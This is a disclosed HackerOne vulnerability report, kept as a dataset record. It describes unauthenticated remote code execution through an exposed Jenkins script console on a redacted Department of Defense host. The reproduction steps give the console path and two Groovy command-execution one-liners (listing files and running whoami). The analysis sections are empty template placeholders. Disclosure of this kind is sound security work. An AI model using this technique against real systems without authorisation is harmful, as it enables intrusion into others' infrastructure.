---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1125329'
original_report_id: '1125329'
title: Unauth RCE on Jenkins Instance at https://█████████/
weakness: OS Command Injection
team_handle: deptofdefense
created_at: '2021-03-14T09:03:46.796Z'
disclosed_at: '2021-03-24T20:55:35.664Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- os-command-injection
---

# Unauth RCE on Jenkins Instance at https://█████████/

## Metadata

- HackerOne Report ID: 1125329
- Weakness: OS Command Injection
- Program: deptofdefense
- Disclosed At: 2021-03-24T20:55:35.664Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
Hi Team,

While Doing Recon on U.s Government Sites, I Found below asset Belongs to U.S Government (Please Check its SSL certificate to confirm or Please check attached  POC Video)
 █████████

https://███/

Attacker can execute Command Injection without Authentication.

## Impact

Unauth RCE

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Navigate to https://███████/_script
2. Please execute below commands to confirm Unauth RCE.

             Commands:  println "ls".execute().text
                                         println "whoami".execute().text
#POC

Please check Attached POC Video to follow steps (If Required)

██████

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
